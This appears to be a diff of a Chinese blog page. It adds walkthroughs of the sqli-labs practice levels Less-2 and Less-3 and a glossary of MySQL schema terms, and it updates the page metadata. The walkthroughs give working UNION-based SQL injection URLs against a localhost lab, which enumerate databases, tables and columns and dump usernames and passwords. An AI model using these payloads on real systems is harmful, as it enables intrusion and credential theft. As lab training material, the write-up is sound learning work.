@@ -463,21 +463,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-10-09
+                    2020-10-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    224
+                    596
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -492,7 +492,24 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="sqli-labs-less-1"><a href="#sqli-labs-less-1" class="headerlink" title="sqli-labs less-1"></a><strong>sqli-labs less-1</strong></h1><p><img src="https://img-blog.csdnimg.cn/20200428184940527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br><strong>1.?id=1<br><img src="https://img-blog.csdnimg.cn/20200428185128798.png"><br><img src="https://img-blog.csdnimg.cn/20200428185141286.png"><br>2.?id=1’报错，发现注入点<br><img src="https://img-blog.csdnimg.cn/20200428185208528.png"><br><img src="https://img-blog.csdnimg.cn/20200428185216186.png"><br>3.添加注释，使其不报错<br><img src="https://img-blog.csdnimg.cn/2020042818523544.png"><br><img src="https://img-blog.csdnimg.cn/20200428185241751.png"><br>4.使用order by 进行查询长度，得出有3个字节<br><img src="https://img-blog.csdnimg.cn/20200428185249454.png"><br><img src="https://img-blog.csdnimg.cn/20200428185255441.png"><br><img src="https://img-blog.csdnimg.cn/20200428185320168.png"><br><img src="https://img-blog.csdnimg.cn/20200428185326483.png"><br>5.使用union select联合查询显示位，注意：最前面的数改为-1或者很大的值<br><img src="https://img-blog.csdnimg.cn/20200428185335180.png"><br><img src="https://img-blog.csdnimg.cn/20200428185346923.png"><br>6.database()查询当前数据库名<br><img src="https://img-blog.csdnimg.cn/2020042818535675.png"><br><img src="https://img-blog.csdnimg.cn/20200428185401490.png"><br>7. version()查询当前数据库版本<br><img src="https://img-blog.csdnimg.cn/20200428185608300.png"><br><img src="https://img-blog.csdnimg.cn/20200428185614530.png"><br>8. (select group_concat(schema_name) from information_schema.schemata )查看所有数据库名<br><img src="https://img-blog.csdnimg.cn/2020042818570396.png"><br><img src="https://img-blog.csdnimg.cn/20200428185709930.png"><br>9. (select group_concat(table_name) from information_schema.tables where table_schema=’security’)查看security数据库中的所有表<br><img src="https://img-blog.csdnimg.cn/20200428185718490.png"><br><img src="https://img-blog.csdnimg.cn/20200428185722279.png"><br>10.(select group_concat(column_name) from information_schema.columns where table_name=’users’)查看users表下的所有列<br><img src="https://img-blog.csdnimg.cn/20200428185729161.png"><br><img src="https://img-blog.csdnimg.cn/20200428185732778.png"><br>11.(select group_concat(username) from security.users）查看username列下的数据<br>    (select group_concat(password) from security.users)     查看password列下的数据<br><img src="https://img-blog.csdnimg.cn/20200428185742437.png"><br><img src="https://img-blog.csdnimg.cn/2020042818574752.png"></strong></p>
+                <p><strong>schema：数据库中的Schema，为数据库对象的集合<br>database 数据库<br>table  表<br>column  列<br>schemata：为当前数据库中的每个架构返回一行<br>group_concat()一次性显示<br>information_schema 数据库是 MySQL 自带的信息数据库。用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</strong></p>
+<h1 id="sqli-labs-less-1"><a href="#sqli-labs-less-1" class="headerlink" title="sqli-labs less-1"></a><strong>sqli-labs less-1</strong></h1><p><img src="https://img-blog.csdnimg.cn/20200428184940527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br><strong>1.?id=1<br><img src="https://img-blog.csdnimg.cn/20200428185128798.png"><br><img src="https://img-blog.csdnimg.cn/20200428185141286.png"><br>2.?id=1’报错，发现注入点<br><img src="https://img-blog.csdnimg.cn/20200428185208528.png"><br><img src="https://img-blog.csdnimg.cn/20200428185216186.png"><br>3.添加注释，使其不报错<br><img src="https://img-blog.csdnimg.cn/2020042818523544.png"><br><img src="https://img-blog.csdnimg.cn/20200428185241751.png"><br>4.使用order by 进行查询长度，得出有3个字节<br><img src="https://img-blog.csdnimg.cn/20200428185249454.png"><br><img src="https://img-blog.csdnimg.cn/20200428185255441.png"><br><img src="https://img-blog.csdnimg.cn/20200428185320168.png"><br><img src="https://img-blog.csdnimg.cn/20200428185326483.png"><br>5.使用union select联合查询显示位，注意：最前面的数改为-1或者很大的值<br><img src="https://img-blog.csdnimg.cn/20200428185335180.png"><br><img src="https://img-blog.csdnimg.cn/20200428185346923.png"><br>6.database()查询当前数据库名<br><img src="https://img-blog.csdnimg.cn/2020042818535675.png"><br><img src="https://img-blog.csdnimg.cn/20200428185401490.png"><br>7. version()查询当前数据库版本<br><img src="https://img-blog.csdnimg.cn/20200428185608300.png"><br><img src="https://img-blog.csdnimg.cn/20200428185614530.png"><br>8. (select group_concat(schema_name) from information_schema.schemata )查看所有数据库名<br><img src="https://img-blog.csdnimg.cn/2020042818570396.png"><br><img src="https://img-blog.csdnimg.cn/20200428185709930.png"><br>9. (select group_concat(table_name) from information_schema.tables where table_schema=’security’)查看security数据库中的所有表<br><img src="https://img-blog.csdnimg.cn/20200428185718490.png"><br><img src="https://img-blog.csdnimg.cn/20200428185722279.png"><br>10.(select group_concat(column_name) from information_schema.columns where table_name=’users’)查看users表下的所有列<br><img src="https://img-blog.csdnimg.cn/20200428185729161.png"><br><img src="https://img-blog.csdnimg.cn/20200428185732778.png"><br>11.(select group_concat(username) from security.users）查看username列下的数据<br>    (select group_concat(password) from security.users)     查看password列下的数据<br><img src="https://img-blog.csdnimg.cn/20200428185742437.png"><br><img src="https://img-blog.csdnimg.cn/2020042818574752.png"></strong></p>
+<h1 id="sqli-labs-less-2"><a href="#sqli-labs-less-2" class="headerlink" title="sqli-labs less-2"></a><strong>sqli-labs less-2</strong></h1><p>1.根据提示得知参数为id<br><img src="https://img-blog.csdnimg.cn/20201015165419790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>2.加入参数，页面回显正确</p>
+<p><img src="https://img-blog.csdnimg.cn/20201015165721272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>3.判断注入类型，首先进行单引号测试，发现加上注释后依然报错，说明此处不存在字符型注入<br><img src="https://img-blog.csdnimg.cn/2020101516584326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>4.进行数值型注入判断，页面异常，说明此处存在数值型注入<br><img src="https://img-blog.csdnimg.cn/20201015170226176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201015170250722.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>5.order by查询字节，得出有3个字节<br><img src="https://img-blog.csdnimg.cn/20201015171009564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/2020101517093379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>6.union select 查询注入点<img src="https://img-blog.csdnimg.cn/20201015181015933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>7.查数据库名</p>
+<pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(schema_name)from%20information_schema.schemata),3--+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20201015181158577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>8.查询表名</p>
+<pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27),3--+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/2020101518275368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>9.查询列名</p>
+<pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27),3--+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20201015184332741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>10.查询列中的数据</p>
+<pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(password)from%20security.users),3--+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20201015190108996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p>
+<pre><code>http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,(select%20group_concat(username)from%20security.users),3--+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20201015190653773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p>
+<h1 id="sqli-labs-less-3"><a href="#sqli-labs-less-3" class="headerlink" title="sqli-labs less-3"></a><strong>sqli-labs less-3</strong></h1><p>1.判断注入类型为字符型注入。闭合形式为’)<br>(听说是根据源码判断出来的)</p>
+<p><img src="https://img-blog.csdnimg.cn/20201015195631368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>其余步骤请参考前两关</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1063,7 +1080,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">7.5k</span>&nbsp;字
+                class="white-color">7.9k</span>&nbsp;字
             
             
             
